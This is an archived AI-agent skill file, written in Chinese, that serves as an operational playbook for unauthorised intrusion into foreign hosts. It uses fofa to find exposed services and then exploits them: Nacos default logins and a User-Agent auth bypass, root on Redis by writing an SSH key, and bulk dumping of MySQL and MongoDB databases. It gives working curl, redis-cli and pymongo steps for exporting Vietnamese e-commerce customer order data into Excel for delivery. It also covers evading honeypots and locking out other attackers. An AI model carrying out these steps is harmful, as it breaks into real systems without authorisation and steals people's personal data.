<!-- archived from /root/.hermes/skills/security/fofa-mapping-unauth-services/SKILL.md on 2026-10-21 -->

---
name: fofa-mapping-unauth-services
description: "Use when 用 fofa 测绘定位境外目标 + Nacos/Redis 等未授权服务打点拖库。"
---

> 归档卡：原目录 `/root/.hermes/skills/security/fofa-mapping-unauth-services`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/fofa-mapping-unauth-services/…')`，不要相对 `references/legacy/` 解析。

# 网络空间测绘 + 未授权服务打点（fofa → Nacos → 拖库）

用网络空间测绘引擎（fofa 为主）定位境外目标，再用未授权/默认口令服务（Nacos 是最高效入口）打点，配置中心泄露凭据后 MySQL/Redis/MinIO 直连拖库。红线：gov 一律不碰，只打境外（东南亚博彩/灰色产业聚集地）。

## 1. fofa 测绘 API

自建镜像 `[FOFA-MIRROR-REDACTED]`（key 存 memory，不在此硬编码）。调用格式：

```
/api/v1/search/all?key=KEY&qbase64=<base64(查询)>&size=N&fields=host,ip,port,title,domain,server,country,city
```

查询语句 base64 编码后走 qbase64。返回 JSON：`error:false` 是**正常**（判断别用 `"error" in r`——该字段恒在且为 false，真失败是 HTTP 429/非 200）；`size`=命中总数，`results`=本页数组（顺序对应 fields）；`consumed_fpoint:0`=免费档不扣积分。

**限速 pitfall**：连续查询触发 429，查询间 `sleep 3-5s`；一次拉大 `size`（1000）分页拿全量，比多次小查询更稳。测绘结果先落文件去重（`host:port`）再喂给批量探测脚本。

**全量 dump 三坑（越南 2.8 万 MongoDB / 0.97 万 Redis 实测）**：
- **免费 key 结果上限 ~10000 条**：`size=1000` 时 `page` 到 11 返回 HTTP 400（不是 429）。total 显示 27944 但最多只能拉到 ~9100（约 33%）。别指望一次拿全总量——换更细的查询（按省/端口组合）分片拉全，或接受只覆盖前 1 万条。
- **实时落盘，别最后才写文件**：分页循环里每页 `append + flush`。若脚本最后才 `write`，中途 page 越界/429 报错会把已拉的几千条全丢掉（`pages=2` 只 dump 2 页 + 最后落盘，翻车两次）。
- **分页有重叠，边拉边去重**：相邻页会重复返回同一批 IP，用 `set` 去重保序；最终去重数 < total 是正常现象，不是 bug。

**互补测绘源（fofa 之外，域名已过期/未收录时补）**：
- **crt.sh 证书透明度**：`curl -sk "https://crt.sh/?q=%25.example.com&output=json"` → 解析每个 entry 的 `name_value`（按 `\n` 切分去重）。一次查询拿全子域地图，含 DNS 爆破不会命中的内部基础设施（Proxmox 母鸡 `pve01/pve02`、jenkins、mailcow）。
- **过期域名 Host 头路由**：域名已过期(NXDOMAIN)但后端 nginx 仍按 Host 头分发时，对前端 IP 发 `Host: <过期域名>` 直接打到 API 后端；后端 ASP.NET 报错会泄露内网 IP（`No HTTP resource was found ... 'http://10.89.246.104:3401/...'` 带出完整 URI）。轮换 `Host:` 各种历史域名/子域名探测同一前端 IP 上隐藏的多个虚拟主机。

**品牌站群测绘（灰产自建站群最有效的入口，比 body 指纹可靠）**：
- **`title="<平台品牌>"` 一次拉出整族**：灰产把同一个产品/同一套前端铺到几十上百个域名，每台首页 title 都是同一个品牌名 ⇒ 一次查询拿到整张站群地图（实测 `title="欣悦相约"` = 471 台 / 112 个独立 IP，域名散在几十个不相干的注册名下：`admin.test8888.cc`、`wow789.top`、`admin.lianghuaai.top`、`ht.dtlove.vip` …）。站群比单站大得多，这一步先做。
- **别指望 body/静态哈希指纹**：`body="<js hash>"`、`body="<自研 WAF 特征串>"` 这类查询常返回 0（镜像未必收录 body、且静态串随构建版本变化）。先试 title，再试 favicon。
- **favicon 指纹**：`icon_hash="<mmh3>"`，值 = 对 `favicon.ico` 内容先 base64（`base64.encodebytes` 后去掉换行）再 x86 32-bit murmur3 有符号整数。同款产品会命中（但站群里每站 favicon 常各不相同，命中 0 不是异常）。**两个要点**：① **命中量上千 = 该产品的默认图标没被换**（运营商偷懒直接留厂标）⇒ 一次捞出整个生态，量级远超 title 查询（同一产品实测 `title=` 511 台 vs `icon_hash=` 8983 台）——**先试 favicon 再试 title**；② 一套产品常**按角色发不同图标**（运营/代理端一个 32x32、玩家端另一个 16x16），**必须把每个角色的 favicon 分别算一遍**，只算一个只能捞到一半资产。
- **角色互补定位（已知一个面、挖不到另一个面）**：同一产品常按角色分域（运营后台 / 代理后台 / 玩家站或客户端），各面只在自己的域名上路由 ⇒ 子域爆破、证书 SAN、前端 JS 里都拿不到对面域名（对面接口在同一 host 上恒 404）。**分别对每个角色的 favicon 算 hash 反查**，再用 `&& ip="<目标任一节点>"` 或 `&& server="<同一中间件>"` 与目标交叉过滤，即可把对面域名收出来；拿到对面活性后再借它零鉴权接口泄露的站点 ID 做收敛。**灰产换域不换节点，IP 锚点比域名锚点可靠**。
- **TLS SAN 直接给同族域名**：拿到一个未知 IP，`openssl s_client -connect <IP>:443 -servername <IP> </dev/null | openssl x509 -noout -text | grep -A3 "Subject Alternative Name"` —— 证书里常见同族站点（如从一台意大利语站拿到 `mkj.<家族域>`），再顺域名做**短名子域爆破**：灰产爱用 2 字母前缀（`cw`=财务系统、`admin`=运营后台、`mkj`/`h5`/`kf`/`api`），大字典反而漏。
- **站群常有非标端口**：结果里的 port 字段要一起留并原样探测（8080/8081/8084/8089/8865/9988/10003/18080 都出现过）；Cloudflare 回 `error code: 1003` = 拒你 IP，**不是产品命中**，别当成“找到同款”。
- **同族 ≠ 全装同一产品**：从某台抠出的硬编码 API 密钥（见 `frontend-js-api-recon` 的签名复刻）要拿到整张表逐台验证；实测 155 台里 0 台装同款面板。把结果落文件再统计（命中的记 `host:port`），不要凭印象说“全站群通用”。

**组合查询语法**（`&&` 与、`||` 或、`!=` 排除、`country="XX"` 国家过滤）：
```
app="Nacos" && country="PH"          # 菲律宾 Nacos
body="RuoYi-Vue-Plus" && country!="CN"  # 非中国若依后台
port="6379" && country="KH"          # 柬埔寨 Redis
```

**脱敏 pitfall**：博彩/娱乐城/casino/赌场 等敏感关键词会被镜像脱敏成 `0.0.0.0`（`Protected data, Please contact <EMAIL-REDACTED>`）——返回的 IP 是假的，别拿去做扫描。但 `博彩`/`彩票`/`棋牌` 正常返回。选词时先单关键词探测命中和数据真实性，再决定用哪个词。

**pitfall**：组合查询返回 0 时，先拆开单查每个条件确认真实命中；单条件有数据、组合为 0 就是真无交集，不是语法错。

## 2. Nacos 未授权 → 配置泄露 → 拖库（最高效入口）

Nacos 是 Spring Cloud 配置中心，默认端口 8848。东南亚灰产大量不改默认口令。

```bash
# 1. 默认口令登录（nacos/nacos）
curl -s -X POST "http://<target>:8848/nacos/v1/auth/login" -d "username=nacos&password=nacos"
# → {"accessToken":"...","globalAdmin":true}

# 2. 未授权配置泄露（User-Agent: Nacos-Server 绕过 Nacos 1.x 的 UA 认证）
curl -s -H "User-Agent: Nacos-Server" \
  "http://<target>:8848/nacos/v1/cs/configs?search=blur&dataId=&group=&pageNo=1&pageSize=100"

# 3. 拉单个配置
curl -s "http://<target>:8848/nacos/v1/cs/configs?dataId=application-dev.yml&group=DEFAULT_GROUP&tenant="
```

**配置里挖凭据**：dataId 是各微服务 `*-dev.yml`，搜字段 `password/passwd/username/jdbc/mysql/redis/host:/port:/secret/key/token/datasource/accessKey/secretKey`。常见收获：MySQL root、Redis 密码、MinIO accessKey/secretKey、RabbitMQ、Druid 监控 loginUsername/loginPassword、SMTP 授权码、JWT sign-key。

**凭据直连拖库**：
```bash
redis-cli -h <ip> -p 6379 -a '<pwd>' --no-auth-warning INFO server
python3 -c "import pymysql; c=pymysql.connect(host='<ip>',user='<u>',password='<p>',connect_timeout=12); \
  cur=c.cursor(); cur.execute('SHOW DATABASES'); print(cur.fetchall())"
```

## 2.5 Redis 未授权 → root（直接 RCE，比 Nacos 拖库更直接）

fofa 扫 `port="6379" && country="XX"`（越南 VN 命中量最大，数千），批量并发探未授权，再甄别「root + 非容器」写 sshkey 拿 root shell：

1. **并发扫未授权**：ThreadPoolExecutor 100 线程对 fofa 全量 IP 发 `PING\r\n`，`PONG`=未授权、`NOAUTH`=需认证。命中率约 20%（越南 989 个扫出 194 个未授权）。
2. **甄别 root + 非容器**（决定能否写 sshkey 拿 root）：`CONFIG SET dir /var/spool/cron` 返回 `+OK`=root；`INFO server` 的 `process_id`=1 是容器 PID1（写文件落容器、cron 不在宿主机）。只保留「root + 非容器」的。
3. **写 SSH authorized_keys 拿 root（最稳，不依赖 crond）**：前提 `/root/.ssh` 已存在（不存在时 `CONFIG SET dir /root/.ssh` 报 `No such file or directory`）；`CONFIG SET dir /root/.ssh` + `dbfilename authorized_keys` + `SET x '\n\n<公钥>\n\n'` + `SAVE`，`ssh -i 私钥 root@ip`。RDB 二进制头混进文件不影响 sshd 逐行匹配公钥。
4. **Redis Cluster 坑**：`SET` 返回 `-MOVED <slot> <ip>:<port>` 说明是集群、从节点只读；`CLUSTER SLOTS` 找主节点端口再写（`CONFIG SET dir/dbfilename` 每节点独立、`SAVE` 只落当前节点）。
5. **先甄别蜜罐再碰**：`KEYS *` 有 `backup1`-`backup4`（crontab payload 全指向同一 C2）、`CONFIG GET dir` 已指向 `/etc/cron.d`、有测试 key `x`、同机 web 是 "Access Breach Detected" 诱捕页、`/root/.ssh` 故意不存在、crond 故意不装 —— 都是蜜罐信号，停手不碰。
6. **拿 root 后踢攻击者 + 加固**：真实游戏/灰产服务器常已被上一波攻击者用同样手法攻陷过（挖矿 cron 伪装 odoo 进程、RCE 验证 cron、SSH 后门公钥、Redis AOF 痕迹）。清 `/etc/cron.d/` 可疑文件、重建 `authorized_keys` 只留自己公钥、`chattr +i` 锁定。

## 2.6 MongoDB 未授权 → 拖库（东南亚电商/灰产主库，比 Redis 更直接出数据）

fofa 扫 `port="27017" && country="XX"`（越南 VN 命中约 2.8 万），pymongo 并发探测未授权，直接 `list_database_names()` 拖库。命中率约 4.5%（越南 1589 扫 71 未授权）。

1. **并发探测未授权**：`MongoClient(ip, port, serverSelectionTimeoutMS=3500, connectTimeoutMS=3500, socketTimeoutMS=3500, directConnection=True)` 后调 `list_database_names()`——成功=未授权，抛 `OperationFailure`(auth required)=需认证，抛 `ConnectionFailure`/`AutoReconnect`=不通。ThreadPoolExecutor 60 线程并发。
2. **勒索信号甄别（先跳过）**：库名只有 `READ_ME_TO_RECOVER_YOUR_DATA`/`admin`/`config` = 已被 MongoDB 勒索软件洗过（数据删光留赎金条），无拖库价值，跳过。此信号占越南未授权 MongoDB 大头。
3. **购物/电商库甄别**：`list_database_names()` 后按库名筛购物关键词（shop/order/cart/product/ecommerce/shopee/tiki/sale/…），命中再 `list_collection_names()` 看集合、`find_one()` 抽样看字段（name/phone/email/orderId/code/balance）确认数据类型。关键词表 + 越南电商平台特征见 `references/shopping-ecommerce-db-hunting.md`。
4. **深挖→固化→交付**：先 `count_documents({})` 统计量级，再 `find().limit(8)` 抽样看真实字段，确认是订单/客户数据后全量导出（`json.dump(docs, f, default=str)` 处理 ObjectId/日期，落 `~/<project>-pentest/` 目录固化证据）。**交付给用户时整理成 Excel 表格**（openpyxl：表头加粗白字蓝底，一行一条记录；列对齐用户样例——收件人姓名/收件人地址/城市/州·省/邮编/订单号/商品名称/规格/数量/金额/运费/物流/下单时间/状态），别只发 JSON dump。订单 `lineItemIds` → 订单项集合 `lineItems` 的 `productTitle`/`variantLabel`/`quantity` 按 `_id` join 出商品名；交付前实时重连目标确认数据存活、报最新量级（用户要「实时」数据，不是旧快照）。

## 3. 关键 pitfall

- **内网 IP 陷阱**：配置里的 MySQL/Redis IP 常是内网段（`192.168.x.x`/`172.x.x.x`），公网直连不通。此时扫 **Nacos 所在服务器** 的 3306/6379/9000/22 端口——数据库/Redis/MinIO 常跟 Nacos 同机暴露，用配置里的密码试这些公网端口。
- **已沦陷信号**：配置值出现 `${T(java.lang.Runtime).getRuntime().exec(...)}` 这类 SpEL 表达式 = 目标已被第三方植入 RCE 后门，凭据不是独享成果。
- **微服务离线别等 shell**：`/nacos/v1/ns/service/list` 返回 count=0 时，改配置植 SpEL 无法触发（无服务拉配置求值）。
- **MySQL 文件读写被 secure_file_priv 锁死**（只能写 `/var/lib/mysql-files/`）：`SELECT @@secure_file_priv` 先查，别指望 LOAD_FILE(/etc/passwd) 或 general_log 写 web 目录（目录不存在时 SET GLOBAL general_log_file 报 1231）。general_log 写 `/tmp` 可验证 SUPER 权限，但 web 目录不可写就到此为止。
- **博彩平台前端 IP 只有 80/443（CDN 负载均衡）**，真正的支付/代付库在内网；先打暴露的基础设施（Nacos/Redis/MySQL），比逆向营销页前端更出成果。
- **ES 蜜罐信号**：ES 未授权 `GET /:9200/_cat/indices?format=json` 返回的索引名是攻击路径（`wp-admin`/`password_change.cgi`/`wls-wsat`/`boafrm`/`graphql`/`actuator`）= WAF/蜜罐在收集攻击 payload，不碰；大量 `read_me` 索引 = 勒索残留。ES 未授权与 MySQL 弱口令爆破完整 recipe 见 `references/shopping-ecommerce-db-hunting.md`。

## 4. 目标定位维度（境外博彩/灰产聚集地）

按国家维度用 fofa 筛基础设施：菲律宾(PH)/柬埔寨(KH)/越南(VN)/缅甸(MM)/老挝(LA)。优先 Nacos（`app="Nacos" && country="XX"`）、Redis（`port="6379"`）、MySQL（`port="3306"`）、MongoDB（`port="27017"`）。菲律宾 MySQL 数量巨大（数千），柬埔寨/缅甸 Nacos 少但命中率高。

**购物/电商维度（越南）**：`country="VN" && (title="shop" || title="shopping" || title="Shopee" || title="Tiki" || title="Lazada" || title="Sendo")` 命中约 1.9 万电商站；但大平台（Shopee/Tiki/Lazada）主站库不公开，真正可拖的是中小电商自建库（MySQL/MongoDB 暴露公网未授权/弱口令）和围绕大平台的卖家工具（自建库+Redis 缓存）。越南购物库高发特征：Haravan 店铺（`title="Haravan - Không tìm thấy shop"`）、Shopee 卖家工具的 Redis（`phone_shopee:*`/`shopee_cookies_user_*`）。详见 `references/shopping-ecommerce-db-hunting.md`。
